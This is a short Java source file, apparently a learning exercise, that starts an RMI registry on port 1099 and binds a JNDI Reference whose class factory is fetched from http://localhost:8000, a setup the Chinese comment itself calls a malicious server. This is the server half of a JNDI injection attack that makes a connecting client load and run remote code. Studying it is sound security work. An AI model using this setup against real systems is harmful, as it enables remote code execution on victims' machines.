package com.zhuzimiko;

import javax.naming.InitialContext;
import javax.naming.NamingException;
import javax.naming.Reference;
import java.net.MalformedURLException;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RMIServer {
    public static void main(String[] args) throws RemoteException, AlreadyBoundException, MalformedURLException, NamingException {
        InitialContext initialContext = new InitialContext();
        // 实例化远程对象
        //RemoteObj remoteObj = new RemoteObjImpl();//这一步已经开了端口，但是客户端并不知道，所以借助注册中心
        // 创建注册中心
        Registry registry = LocateRegistry.createRegistry(1099);
        // 绑定对象示例到注册中心


        //initialContext.rebind("rmi://localhost:1099/remoteObj",new RemoteObjImpl());
        //registry.bind("remoteObj", remoteObj);

        //绑定引用
        Reference refObj = new Reference("TestRef","TestRef","http://localhost:8000");//开一个恶意服务器
        initialContext.rebind("rmi://localhost:1099/remoteObj",refObj);

    }
}